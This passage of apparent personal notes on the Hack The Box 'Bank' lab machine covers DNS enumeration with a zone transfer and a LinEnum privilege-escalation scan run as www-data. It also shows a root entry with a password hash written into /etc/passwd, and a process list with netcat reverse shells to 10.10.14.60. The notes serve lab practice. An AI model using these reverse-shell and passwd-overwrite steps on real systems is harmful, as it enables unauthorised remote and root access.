/>$1$iQ6kkmiJ$1f7eqBvCAc5fhg76BcaL40<br />vi /etc/passwd<br />root:$1$iQ6kkmiJ$1f7eqBvCAc5fhg76BcaL40:0:0:root:/root:/bin/bash<br />:wq!<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-5'>Bank dns</h1><br/>root@kali:~/Desktop/Machines/HTB/Bank# nslookup<br />&gt; SERVER 10.10.10.29<br />Default server: 10.10.10.29<br />Address: 10.10.10.29#53<br />&gt; 127.0.0.1<br />1.0.0.127.in-addr.arpa	name = localhost.<br />&gt; 10.10.10.29<br />** server can&#39;t find 29.10.10.10.in-addr.arpa: NXDOMAIN<br />&gt; bank.htb<br />Server:		10.10.10.29<br />Address:	10.10.10.29#53<br /><br />Name:	bank.htb<br />Address: 10.10.10.29<br /><br />dnsrecon -r 127.0.0.0/24 -n 10.10.10.29<br />dnsrecon -r 127.0.1.0/24 -n 10.10.10.29<br />dnsrecon -r 10.10.10.0/24 -n 10.10.10.29<br /><br />root@kali:~/Desktop/Machines/HTB/Bank# dig axfr @10.10.10.29<br /><br />; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1-Debian &lt;&lt;&gt;&gt; axfr @10.10.10.29<br />; (1 server found)<br />;; global options: +cmd<br />;; Query time: 154 msec<br />;; SERVER: 10.10.10.29#53(10.10.10.29)<br />;; WHEN: Sat Jul 20 12:18:47 EDT 2019<br />;; MSG SIZE  rcvd: 28<br /><br />root@kali:~/Desktop/Machines/HTB/Bank# dig axfr bank.htb @10.10.10.29<br /><br />; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1-Debian &lt;&lt;&gt;&gt; axfr bank.htb @10.10.10.29<br />;; global options: +cmd<br />bank.htb.		604800	IN	SOA	bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800<br />bank.htb.		604800	IN	NS	ns.bank.htb.<br />bank.htb.		604800	IN	A	10.10.10.29<br />ns.bank.htb.		604800	IN	A	10.10.10.29<br /><a href="http://www.bank.htb.">www.bank.htb.		604800	IN	CNAME	bank.htb.</a><br />bank.htb.		604800	IN	SOA	bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800<br />;; Query time: 152 msec<br />;; SERVER: 10.10.10.29#53(10.10.10.29)<br />;; WHEN: Sat Jul 20 12:19:03 EDT 2019<br />;; XFR size: 6 records (messages 1, bytes 171)<br /><br />------------------------------------------------------------------------------------<br />nano /etc/resolv.conf<br /># Generated by NetworkManager<br />search localdomain<br />nameserver 10.10.10.29<br />nameserver 192.168.163.2<br />-------------------------------------------------------------------------------------<br />can navigate to bank.htb now!!<br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-5'>LinEnum</h1><br/>-e <br />\e[00;31m#########################################################\e[00m<br />-e \e[00;31m#\e[00m \e[00;33mLocal Linux Enumeration &amp; Privilege Escalation Script\e[00m \e[00;31m#\e[00m<br />-e \e[00;31m#########################################################\e[00m<br />-e \e[00;33m# <a href="http://www.rebootuser.com\e[00m">www.rebootuser.com\e[00m</a><br />-e \e[00;33m# version 0.97\e[00m<br /><br />[-] Debug Info<br />-e \e[00;33m[+] Thorough tests = Disabled\e[00m<br />-e <br /><br />-e \e[00;33mScan started at:<br />Sat Jul 20 22:04:21 EEST 2019<br />-e \e[00m<br /><br />-e \e[00;33m### SYSTEM ##############################################\e[00m<br />-e \e[00;31m[-] Kernel information:\e[00m<br />Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686 athlon i686 GNU/Linux<br />-e <br /><br />-e \e[00;31m[-] Kernel information (continued):\e[00m<br />Linux version 4.4.0-79-generic (buildd@lcy01-30) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3) ) #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017<br />-e <br /><br />-e \e[00;31m[-] Specific release information:\e[00m<br />DISTRIB_ID=Ubuntu<br />DISTRIB_RELEASE=14.04<br />DISTRIB_CODENAME=trusty<br />DISTRIB_DESCRIPTION=&quot;Ubuntu 14.04.5 LTS&quot;<br />NAME=&quot;Ubuntu&quot;<br />VERSION=&quot;14.04.5 LTS, Trusty Tahr&quot;<br />ID=ubuntu<br />ID_LIKE=debian<br />PRETTY_NAME=&quot;Ubuntu 14.04.5 LTS&quot;<br />VERSION_ID=&quot;14.04&quot;<br />HOME_URL=&quot;<a href="http://www.ubuntu.com/"">http://www.ubuntu.com/&quot;</a><br />SUPPORT_URL=&quot;<a href="http://help.ubuntu.com/"">http://help.ubuntu.com/&quot;</a><br />BUG_REPORT_URL=&quot;<a href="http://bugs.launchpad.net/ubuntu/"">http://bugs.launchpad.net/ubuntu/&quot;</a><br />-e <br /><br />-e \e[00;31m[-] Hostname:\e[00m<br />bank<br />-e <br /><br />-e \e[00;33m### USER/GROUP ##########################################\e[00m<br />-e \e[00;31m[-] Current user/group info:\e[00m<br />uid=33(www-data) gid=33(www-data) groups=33(www-data)<br />-e <br /><br />-e \e[00;31m[-] Users that have previously logged onto the system:\e[00m<br />Username         Port     From             Latest<br />root             tty1                      Fri Jun 16 07:44:56 +0300 2017<br />chris            pts/0    192.168.147.1    Sun May 28 22:16:12 +0300 2017<br />-e <br /><br />-e \e[00;31m[-] Who else is logged on:\e[00m<br /> 22:04:21 up  3:37,  0 users,  load average: 0.03, 0.04, 0.01<br />USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br />-e <br /><br />-e \e[00;31m[-] Group memberships:\e[00m<br />uid=0(root) gid=0(root) groups=0(root)<br />uid=1(daemon) gid=1(daemon) groups=1(daemon)<br />uid=2(bin) gid=2(bin) groups=2(bin)<br />uid=3(sys) gid=3(sys) groups=3(sys)<br />uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)<br />uid=5(games) gid=60(games) groups=60(games)<br />uid=6(man) gid=12(man) groups=12(man)<br />uid=7(lp) gid=7(lp) groups=7(lp)<br />uid=8(mail) gid=8(mail) groups=8(mail)<br />uid=9(news) gid=9(news) groups=9(news)<br />uid=10(uucp) gid=10(uucp) groups=10(uucp)<br />uid=13(proxy) gid=13(proxy) groups=13(proxy)<br />uid=33(www-data) gid=33(www-data) groups=33(www-data)<br />uid=34(backup) gid=34(backup) groups=34(backup)<br />uid=38(list) gid=38(list) groups=38(list)<br />uid=39(irc) gid=39(irc) groups=39(irc)<br />uid=41(gnats) gid=41(gnats) groups=41(gnats)<br />uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)<br />uid=100(libuuid) gid=101(libuuid) groups=101(libuuid)<br />uid=101(syslog) gid=104(syslog) groups=104(syslog),4(adm)<br />uid=102(messagebus) gid=106(messagebus) groups=106(messagebus)<br />uid=103(landscape) gid=109(landscape) groups=109(landscape)<br />uid=1000(chris) gid=1000(chris) groups=1000(chris),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)<br />uid=104(sshd) gid=65534(nogroup) groups=65534(nogroup)<br />uid=105(bind) gid=112(bind) groups=112(bind)<br />uid=106(mysql) gid=114(mysql) groups=114(mysql)<br />-e <br /><br />-e \e[00;31m[-] Contents of /etc/passwd:\e[00m<br />root:x:0:0:root:/root:/bin/bash<br />daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br />bin:x:2:2:bin:/bin:/usr/sbin/nologin<br />sys:x:3:3:sys:/dev:/usr/sbin/nologin<br />sync:x:4:65534:sync:/bin:/bin/sync<br />games:x:5:60:games:/usr/games:/usr/sbin/nologin<br />man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br />lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br />mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br />news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br />uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br />proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br />www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br />backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br />list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br />irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br />gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br />nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br />libuuid:x:100:101::/var/lib/libuuid:<br />syslog:x:101:104::/home/syslog:/bin/false<br />messagebus:x:102:106::/var/run/dbus:/bin/false<br />landscape:x:103:109::/var/lib/landscape:/bin/false<br />chris:x:1000:1000:chris,,,:/home/chris:/bin/bash<br />sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin<br />bind:x:105:112::/var/cache/bind:/bin/false<br />mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false<br />-e <br /><br />-e \e[00;31m[-] Super user account(s):\e[00m<br />root<br />-e <br /><br />-e \e[00;31m[-] Are permissions on /home directories lax:\e[00m<br />total 12K<br />drwxr-xr-x  3 root  root  4.0K May 28  2017 .<br />drwxr-xr-x 22 root  root  4.0K Dec 24  2017 ..<br />drwxr-xr-x  3 chris chris 4.0K Jun 14  2017 chris<br />-e <br /><br />-e \e[00;31m[-] Root is allowed to login via SSH:\e[00m<br />PermitRootLogin yes<br />-e <br /><br />-e \e[00;33m### ENVIRONMENTAL #######################################\e[00m<br />-e \e[00;31m[-] Environment information:\e[00m<br />SHLVL=2<br />OLDPWD=/<br />APACHE_RUN_DIR=/var/run/apache2<br />APACHE_PID_FILE=/var/run/apache2/apache2.pid<br />_=/bin/sh<br />TERM=screen<br />PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br />APACHE_LOCK_DIR=/var/lock/apache2<br />LANG=C<br />APACHE_RUN_USER=www-data<br />APACHE_RUN_GROUP=www-data<br />APACHE_LOG_DIR=/var/log/apache2<br />PWD=/var/www/bank/uploads<br />-e <br /><br />-e \e[00;31m[-] Path information:\e[00m<br />/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br />-e <br /><br />-e \e[00;31m[-] Available shells:\e[00m<br /># /etc/shells: valid login shells<br />/bin/sh<br />/bin/dash<br />/bin/bash<br />/bin/rbash<br />/usr/bin/tmux<br />/usr/bin/screen<br />-e <br /><br />-e \e[00;31m[-] Current umask value:\e[00m<br />0022<br />u=rwx,g=rx,o=rx<br />-e <br /><br />-e \e[00;31m[-] umask value as specified in /etc/login.defs:\e[00m<br />UMASK		022<br />-e <br /><br />-e \e[00;31m[-] Password and storage information:\e[00m<br />PASS_MAX_DAYS	99999<br />PASS_MIN_DAYS	0<br />PASS_WARN_AGE	7<br />ENCRYPT_METHOD SHA512<br />-e <br /><br />-e \e[00;33m### JOBS/TASKS ##########################################\e[00m<br />-e \e[00;31m[-] Cron jobs:\e[00m<br />-rw-r--r-- 1 root root  722 Feb  9  2013 /etc/crontab<br /><br />/etc/cron.d:<br />total 16<br />drwxr-xr-x  2 root root 4096 May 28  2017 .<br />drwxr-xr-x 96 root root 4096 Jul 20 18:26 ..<br />-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder<br />-rw-r--r--  1 root root  510 Feb  9  2017 php5<br /><br />/etc/cron.daily:<br />total 76<br />drwxr-xr-x  2 root root  4096 Jun 15  2017 .<br />drwxr-xr-x 96 root root  4096 Jul 20 18:26 ..<br />-rw-r--r--  1 root root   102 Feb  9  2013 .placeholder<br />-rwxr-xr-x  1 root root   625 May  9  2017 apache2<br />-rwxr-xr-x  1 root root   376 Apr  4  2014 apport<br />-rwxr-xr-x  1 root root 15481 Apr 10  2014 apt<br />-rwxr-xr-x  1 root root   314 Feb 18  2014 aptitude<br />-rwxr-xr-x  1 root root   355 Jun  4  2013 bsdmainutils<br />-rwxr-xr-x  1 root root   256 Mar  7  2014 dpkg<br />-rwxr-xr-x  1 root root   372 Jan 22  2014 logrotate<br />-rwxr-xr-x  1 root root  1261 Sep 23  2014 man-db<br />-rwxr-xr-x  1 root root   435 Jun 20  2013 mlocate<br />-rwxr-xr-x  1 root root   249 Feb 17  2014 passwd<br />-rwxr-xr-x  1 root root  2417 May 13  2013 popularity-contest<br />-rwxr-xr-x  1 root root   214 Oct  7  2014 update-notifier-common<br />-rwxr-xr-x  1 root root   328 Jul 18  2014 upstart<br /><br />/etc/cron.hourly:<br />total 12<br />drwxr-xr-x  2 root root 4096 May 28  2017 .<br />drwxr-xr-x 96 root root 4096 Jul 20 18:26 ..<br />-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder<br /><br />/etc/cron.monthly:<br />total 12<br />drwxr-xr-x  2 root root 4096 May 28  2017 .<br />drwxr-xr-x 96 root root 4096 Jul 20 18:26 ..<br />-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder<br /><br />/etc/cron.weekly:<br />total 28<br />drwxr-xr-x  2 root root 4096 Jun 15  2017 .<br />drwxr-xr-x 96 root root 4096 Jul 20 18:26 ..<br />-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder<br />-rwxr-xr-x  1 root root  730 Feb 23  2014 apt-xapian-index<br />-rwxr-xr-x  1 root root  427 Apr 16  2014 fstrim<br />-rwxr-xr-x  1 root root  771 Sep 23  2014 man-db<br />-rwxr-xr-x  1 root root  211 Oct  7  2014 update-notifier-common<br />-e <br /><br />-e \e[00;31m[-] Crontab contents:\e[00m<br /># /etc/crontab: system-wide crontab<br /># Unlike any other crontab you don&#39;t have to run the `crontab&#39;<br /># command to install the new version when you edit this file<br /># and files in /etc/cron.d. These files also have username fields,<br /># that none of the other crontabs do.<br /><br />SHELL=/bin/sh<br />PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br /><br /># m h dom mon dow user	command<br />17 *	* * *	root    cd / &amp;&amp; run-parts --report /etc/cron.hourly<br />25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )<br />47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )<br />52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )<br />#<br />-e <br /><br />-e \e[00;33m### NETWORKING  ##########################################\e[00m<br />-e \e[00;31m[-] Network and IP info:\e[00m<br />eth0      Link encap:Ethernet  HWaddr 00:50:56:b9:9e:a6  <br />          inet addr:10.10.10.29  Bcast:10.10.10.255  Mask:255.255.255.0<br />          inet6 addr: fe80::250:56ff:feb9:9ea6/64 Scope:Link<br />          inet6 addr: dead:beef::250:56ff:feb9:9ea6/64 Scope:Global<br />          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br />          RX packets:1262958 errors:0 dropped:11 overruns:0 frame:0<br />          TX packets:1078503 errors:0 dropped:0 overruns:0 carrier:0<br />          collisions:0 txqueuelen:1000 <br />          RX bytes:339118289 (339.1 MB)  TX bytes:381222852 (381.2 MB)<br />          Interrupt:19 Base address:0x2000 <br /><br />lo        Link encap:Local Loopback  <br />          inet addr:127.0.0.1  Mask:255.0.0.0<br />          inet6 addr: ::1/128 Scope:Host<br />          UP LOOPBACK RUNNING  MTU:65536  Metric:1<br />          RX packets:2606 errors:0 dropped:0 overruns:0 frame:0<br />          TX packets:2606 errors:0 dropped:0 overruns:0 carrier:0<br />          collisions:0 txqueuelen:1 <br />          RX bytes:268400 (268.4 KB)  TX bytes:268400 (268.4 KB)<br />-e <br /><br />-e \e[00;31m[-] ARP history:\e[00m<br />? (10.10.10.2) at 00:50:56:b9:c8:cd [ether] on eth0<br />-e <br /><br />-e \e[00;31m[-] Nameserver(s):\e[00m<br />nameserver 10.10.10.29<br />nameserver 192.168.1.7<br />-e <br /><br />-e \e[00;31m[-] Default route:\e[00m<br />default         10.10.10.2      0.0.0.0         UG    0      0        0 eth0<br />-e <br /><br />-e \e[00;31m[-] Listening TCP:\e[00m<br />Active Internet connections (only servers)<br />Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name<br />tcp        0      0 10.10.10.29:53          0.0.0.0:*               LISTEN      -               <br />tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      -               <br />tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               <br />tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      -               <br />tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               <br />tcp6       0      0 :::80                   :::*                    LISTEN      -               <br />tcp6       0      0 :::53                   :::*                    LISTEN      -               <br />tcp6       0      0 :::22                   :::*                    LISTEN      -               <br />tcp6       0      0 ::1:953                 :::*                    LISTEN      -               <br />-e <br /><br />-e \e[00;31m[-] Listening UDP:\e[00m<br />Active Internet connections (only servers)<br />Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name<br />udp        0      0 10.10.10.29:53          0.0.0.0:*                           -               <br />udp        0      0 127.0.0.1:53            0.0.0.0:*                           -               <br />udp6       0      0 :::53                   :::*                                -               <br />-e <br /><br />-e \e[00;33m### SERVICES #############################################\e[00m<br />-e \e[00;31m[-] Running processes:\e[00m<br />USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND<br />root         1  0.0  0.3   4352  3436 ?        Ss   18:26   0:02 /sbin/init<br />root         2  0.0  0.0      0     0 ?        S    18:26   0:00 [kthreadd]<br />root         3  0.0  0.0      0     0 ?        S    18:26   0:01 [ksoftirqd/0]<br />root         5  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [kworker/0:0H]<br />root         6  0.0  0.0      0     0 ?        S    18:26   0:00 [kworker/u16:0]<br />root         7  0.0  0.0      0     0 ?        S    18:26   0:00 [rcu_sched]<br />root         8  0.0  0.0      0     0 ?        S    18:26   0:00 [rcu_bh]<br />root         9  0.0  0.0      0     0 ?        S    18:26   0:00 [migration/0]<br />root        10  0.0  0.0      0     0 ?        S    18:26   0:00 [watchdog/0]<br />root        11  0.0  0.0      0     0 ?        S    18:26   0:00 [kdevtmpfs]<br />root        12  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [netns]<br />root        13  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [perf]<br />root        14  0.0  0.0      0     0 ?        S    18:26   0:00 [khungtaskd]<br />root        15  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [writeback]<br />root        16  0.0  0.0      0     0 ?        SN   18:26   0:00 [ksmd]<br />root        17  0.0  0.0      0     0 ?        SN   18:26   0:00 [khugepaged]<br />root        18  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [crypto]<br />root        19  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [kintegrityd]<br />root        20  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [bioset]<br />root        21  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [kblockd]<br />root        22  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [ata_sff]<br />root        23  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [md]<br />root        24  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [devfreq_wq]<br />root        25  0.0  0.0      0     0 ?        S    18:26   0:00 [kworker/u16:1]<br />root        26  0.0  0.0      0     0 ?        S    18:26   0:01 [kworker/0:1]<br />root        28  0.0  0.0      0     0 ?        S    18:26   0:00 [kswapd0]<br />root        29  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [vmstat]<br />root        30  0.0  0.0      0     0 ?        S    18:26   0:00 [fsnotify_mark]<br />root        31  0.0  0.0      0     0 ?        S    18:26   0:00 [ecryptfs-kthrea]<br />root        47  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [kthrotld]<br />root        48  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [acpi_thermal_pm]<br />root        49  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [bioset]<br />root        50  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [bioset]<br />root        51  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [bioset]<br />root        53  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [bioset]<br />root        54  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [bioset]<br />root        55  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [bioset]<br />root        56  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [bioset]<br />root        57  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [bioset]<br />root        58  0.0  0.0      0     0 ?        S    18:26   0:00 [scsi_eh_0]<br />root        59  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [scsi_tmf_0]<br />root        60  0.0  0.0      0     0 ?        S    18:26   0:00 [scsi_eh_1]<br />root        61  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [scsi_tmf_1]<br />root        64  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [ipv6_addrconf]<br />root        77  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [deferwq]<br />root        78  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [charger_manager]<br />root        80  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [bioset]<br />root        81  0.0  0.0      0     0 ?        S    18:26   0:00 [kworker/0:2]<br />root       136  0.0  0.0      0     0 ?        S    18:26   0:00 [scsi_eh_2]<br />root       137  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [scsi_tmf_2]<br />root       138  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [vmw_pvscsi_wq_2]<br />root       139  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [bioset]<br />root       151  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [kpsmoused]<br />root       153  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [kworker/0:1H]<br />root       168  0.0  0.0      0     0 ?        S    18:26   0:00 [jbd2/sda1-8]<br />root       169  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [ext4-rsv-conver]<br />root       318  0.0  0.0   3028   140 ?        S    18:26   0:00 upstart-udev-bridge --daemon<br />root       322  0.0  0.3  12340  3264 ?        Ss   18:26   0:00 /lib/systemd/systemd-udevd --daemon<br />message+   366  0.0  0.2   4268  2148 ?        Ss   18:26   0:00 dbus-daemon --system --fork<br />root       396  0.0  0.2   3996  2788 ?        Ss   18:26   0:00 /lib/systemd/systemd-logind<br />syslog     404  0.0  0.2  30492  2804 ?        Ssl  18:26   0:00 rsyslogd<br />root       419  0.0  0.1   3024  1636 ?        S    18:26   0:00 upstart-file-bridge --daemon<br />root       500  0.0  0.0      0     0 ?        S&lt;   18:26   0:00 [ttm_swap]<br />root       614  0.0  0.0   2888   156 ?        S    18:26   0:00 upstart-socket-bridge --daemon<br />root       790  0.0  0.1   4660  1860 tty4     Ss+  18:26   0:00 /sbin/getty -8 38400 tty4<br />root       793  0.0  0.1   4660  2040 tty5     Ss+  18:26   0:00 /sbin/getty -8 38400 tty5<br />root       798  0.0  0.1   4660  2028 tty2     Ss+  18:26   0:00 /sbin/getty -8 38400 tty2<br />root       799  0.0  0.1   4660  1880 tty3     Ss+  18:26   0:00 /sbin/getty -8 38400 tty3<br />root       802  0.0  0.1   4660  1960 tty6     Ss+  18:26   0:00 /sbin/getty -8 38400 tty6<br />root       835  0.0  0.4   7828  4824 ?        Ss   18:26   0:00 /usr/sbin/sshd -D<br />daemon     836  0.0  0.0   2656   124 ?        Ss   18:26   0:00 atd<br />root       838  0.0  0.2   3068  2152 ?        Ss   18:26   0:00 cron<br />mysql      925  0.0  4.5 327096 46772 ?        Ssl  18:26   0:05 /usr/sbin/mysqld<br />root       943  0.0  0.1   2212  1464 ?        Ss   18:26   0:00 acpid -c /etc/acpi/events -s /var/run/acpid.socket<br />bind       955  0.0  1.5  46152 15680 ?        Ssl  18:26   0:00 /usr/sbin/named -u bind<br />root       995  0.0  0.6  42800  6256 ?        Sl   18:26   0:09 /usr/bin/vmtoolsd<br />root      1073  0.0  2.0 103516 21408 ?        Ss   18:26   0:00 /usr/sbin/apache2 -k start<br />www-data  1076  0.0  0.3  21540  3636 ?        S    18:26   0:00 /usr/sbin/apache2 -k start<br />root      1123  0.0  0.1   4660  2032 tty1     Ss+  18:26   0:00 /sbin/getty -8 38400 tty1<br />root      1403  0.0  0.0      0     0 ?        S    18:39   0:00 [kauditd]<br />www-data  1555  0.0  1.1 103884 11844 ?        S    19:25   0:06 /usr/sbin/apache2 -k start<br />www-data  1583  0.0  1.1 103884 11736 ?        S    19:44   0:06 /usr/sbin/apache2 -k start<br />www-data  1594  0.0  1.1 103884 12064 ?        S    19:44   0:06 /usr/sbin/apache2 -k start<br />www-data  1597  0.0  1.1 103884 11852 ?        S    19:46   0:05 /usr/sbin/apache2 -k start<br />www-data  1598  0.0  0.7 103920  7616 ?        S    19:48   0:05 /usr/sbin/apache2 -k start<br />www-data  1604  0.0  1.1 103892 11668 ?        S    19:48   0:05 /usr/sbin/apache2 -k start<br />www-data  1625  0.0  1.2 103884 12396 ?        S    20:15   0:03 /usr/sbin/apache2 -k start<br />www-data  1628  0.0  1.1 103884 11780 ?        S    20:15   0:03 /usr/sbin/apache2 -k start<br />www-data  1634  0.0  1.1 103908 11808 ?        S    20:27   0:01 /usr/sbin/apache2 -k start<br />www-data  1636  0.0  0.9 103596  9584 ?        S    20:34   0:00 /usr/sbin/apache2 -k start<br />www-data  1663  0.0  0.0   2284   628 ?        S    21:15   0:00 sh -c nc 10.10.14.60 3232 -c /bin/bash<br />www-data  1664  0.0  0.0   2284   584 ?        S    21:15   0:00 sh -c /bin/bash<br />www-data  1665  0.0  0.2   3444  2648 ?        S    21:15   0:00 /bin/bash<br />www-data  1670  0.0  0.5   7548  5904 ?        S    21:27   0:00 python -c import pty;pty.spawn(&quot;/bin/bash&quot;);<br />www-data  1671  0.0  0.2   3556  2968 pts/0    Ss+  21:27   0:00 /bin/bash<br />www-data  1674  0.0  0.0   2284   608 ?        S    21:31   0:00 sh -c nc 10.10.14.60 3232 -c /bin/bash<br />www-data  1675  0.0  0.0   2284   628 ?        S    21:31   0:00 sh -c /bin/bash<br />www-data  1676  0.0  0.2   3444  2700 ?        S    21:31   0:00 /bin/bash<br />www-data  1678  0.0  0.5   7548  5888 ?        S    21:31   0:00 python -c import pty;pty.spawn(&quot;/bin/bash&quot;);<br />www-data  1679  0.0  0.2   3556  2932 pts/2    Ss+  21:31   0:00 /bin/bash<br />www-data  1682  0.0  0.0   2284   620 ?        S    21:33   0:00 sh -c nc 10.10.14.60 3232 -c /bin/bash<br />www-data  1683  0.0  0.0   2284   580 ?        S    21:33   0:00 sh -c /bin/bash<br />www-data  1684  0.0  0.2   3444  2684 ?        S    21:33   0:00 /bin/bash<br />www-data  1686  0.0  0.5   7548  5780 ?        S    21:33   0:00 python -c import pty;pty.spawn(&quot;/bin/bash&quot;);<br />www-data  1687  0.0  0.2   3588  3056 pts/3    Ss   21:33   0:00 /bin/bash<br />root      2481  0.0  0.0      0     0 ?        S    22:02   0:00 [kworker/u16:2]<br />www-data  2713  0.0  0.1   2416  1564 pts/3    S+   22:04   0:00 sh ./LinEnum.sh<br />www-data  2714  0.0  0.1   2416  1260 pts/3    S+   22:04   0:00 sh ./LinEnum.sh<br />www-data  2715  0.0  0.0   2192   528 pts/3    S+   22:04   0:00 tee -a<br />www-data  2853  0.0  0.1   3156  1948 pts/3    R+   22:04   0:00 ps aux<br />-e <br /><br />-e \e[00;31m[-] Process binaries and associated permissions (from above list):\e[00m<br />-rwxr-xr-x 1 root root   986672 May 16  2017 /bin/bash<br />-rwxr-xr-x 1 root root   259552 Feb  7  2017 /lib/systemd/systemd-logind<br />-rwxr-xr-x 1 root root   235064 Feb  7  2017 /lib/systemd/systemd-udevd<br />-rwxr-xr-x 2 root root    26756 Nov 24  2016 /sbin/getty<br />-rwxr-xr-x 1 root root   252080 Jul 18  2014 /sbin/init<br />-rwxr-xr-x 1 root root    38996 Jun 17  2014 /usr/bin/vmtoolsd<br />-rwxr-xr-x 1 root root   597796 May  9  2017 /usr/sbin/apache2<br />-rwxr-xr-x 1 root root 10724544 Apr 25  2017 /usr/sbin/mysqld<br />-rwxr-xr-x 1 root root   573516 Apr 13  2017 /usr/sbin/named<br />-rwxr-xr-x 1 root root   834648 Aug 11  2016 /usr/sbin/sshd<br />-e <br /><br />-e \e[00;31m[-] /etc/init.d/ binary permissions:\e[00m<br />total 204<br />drwxr-xr-x  2 root root 4096 Dec 24  2017 .<br />drwxr-xr-x 96 root root 4096 Jul 20 18:26 ..<br />-rw-r--r--  1 root root    0 Aug  3  2016 .legacy-bootordering<br />-rw-r--r--  1 root root 2427 Mar 13  2014 README<br />-rwxr-xr-x  1 root root 2243 Apr  3  2014 acpid<br />-rwxr-xr-x  1 root root 9974 Jan  7  2014 apache2<br />-rwxr-xr-x  1 root root 4125 Mar 16  2017 apparmor<br />-rwxr-xr-x  1 root root 2801 May 18  2016 apport<br />-rwxrwxr-x  1 root root 1071 Sep  8  2013 atd<br />-rwxr-xr-x  1 root root 3451 Apr 13  2017 bind9<br />-rwxr-xr-x  1 root root 1919 Jan 18  2011 console-setup<br />lrwxrwxrwx  1 root root   21 May 28  2017 cron -&gt; /lib/init/upstart-job<br />-rwxr-xr-x  1 root root 2813 Nov 25  2014 dbus<br />-rwxr-xr-x  1 root root 1217 Mar  7  2013 dns-clean<br />lrwxrwxrwx  1 root root   21 Mar 14  2012 friendly-recovery -&gt; /lib/init/upstart-job<br />-rwxr-xr-x  1 root root 1105 May 13  2015 grub-common<br />-rwxr-xr-x  1 root root 1329 Mar 13  2014 halt<br />-rwxr-xr-x  1 root root 1864 Nov 12  2012 irqbalance<br 